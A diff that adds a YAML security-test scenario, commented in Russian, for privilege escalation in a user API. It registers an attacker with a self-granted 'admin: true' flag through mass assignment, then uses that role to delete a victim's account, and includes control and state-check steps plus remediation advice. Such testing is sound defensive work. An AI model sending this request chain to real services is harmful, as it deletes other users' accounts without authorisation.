@@ -1,0 +1,104 @@
+---
+# ── Метаданные ──
+id: privilege-escalation-delete
+name: Эскалация привилегий — самоназначенный админ удаляет чужой аккаунт
+description: >
+  Цепочка из двух слабостей. Сначала при регистрации передаётся admin: true
+  (mass assignment) — пользователь сам выдаёт себе права администратора. Затем
+  он вызывает админ-функцию DELETE /users/v1/{username}, закрытую для обычных
+  пользователей. Контрольный шаг доказывает, что обычному юзеру удаление
+  запрещено (401), значит проблема именно в самоназначении прав. Вердикт — по
+  фактическому состоянию: аккаунт жертвы действительно исчезает
+  (Transaction State Validation).
+severity: critical
+wstg: WSTG-ATHZ-03                   # Testing for Privilege Escalation
+tags: [authz, privilege-escalation, bfla, mass-assignment]
+remediation: >
+  Не принимать поле admin из тела запроса (allowlist полей регистрации); права
+  администратора выдавать только на сервере. Проверять роль на админ-функциях.
+
+# ── Роли ──
+roles:
+  normal:                            # обычный юзер: нужен для контроля "удаление запрещено"
+    username: ${normal_name}
+    password: ${password}
+  attacker:                          # самоназначенный админ через mass assignment
+    username: ${attacker_name}
+    password: ${password}
+
+# ── Переменные ──
+vars:
+  victim_name: victim-${run_id}
+  normal_name: normal-${run_id}
+  attacker_name: attacker-${run_id}
+  password: Passw0rd-${run_id}
+  admin: true                        # bool: подставится как true, а не строка "true"
+
+# ── Шаги ──
+steps:
+  - name: Регистрация жертвы
+    type: setup
+    request:
+      method: POST
+      path: /users/v1/register
+      json:
+        username: ${victim_name}
+        password: ${password}
+        email: ${victim_name}@test.local
+    expect:
+      status: 200
+
+  - name: Регистрация обычного пользователя
+    type: setup
+    request:
+      method: POST
+      path: /users/v1/register
+      json:
+        username: ${normal_name}
+        password: ${password}
+        email: ${normal_name}@test.local
+    expect:
+      status: 200
+
+  - name: Регистрация атакующего с admin=true
+    type: setup                      # mass assignment: заявка на права админа
+    request:
+      method: POST
+      path: /users/v1/register
+      json:
+        username: ${attacker_name}
+        password: ${password}
+        email: ${attacker_name}@test.local
+        admin: ${admin}
+    expect:
+      status: 200
+
+  - name: Контроль — обычному юзеру удаление запрещено
+    type: setup                      # доказываем, что функция реально админ-гейтед
+    as: normal
+    request:
+      method: DELETE
+      path: /users/v1/${victim_name}
+    expect:
+      status: [401, 403]             # обычный юзер НЕ может удалять → контроль пройден
+
+  - name: Самоназначенный админ удаляет жертву
+    type: setup                      # доставка: вызов админ-функции украденной ролью
+    as: attacker
+    request:
+      method: DELETE
+      path: /users/v1/${victim_name}
+    secure_if:
+      status: [401, 403]             # сервер не признал самозваного админа → SECURE, стоп
+    expect:
+      status: 200                    # удаление прошло — доказываем вред ниже
+
+  - name: Проверка состояния — аккаунт жертвы удалён
+    type: attack                     # провал безопасного ожидания = VULNERABLE
+    request:                         # профиль доступен анонимно
+      method: GET
+      path: /users/v1/${victim_name}
+    expect:                          # БЕЗОПАСНО: жертва на месте, её не могли удалить
+      status: 200
+      json:
+        $.username: ${victim_name}   # если 404/нет юзера → удаление состоялось → уязвимость
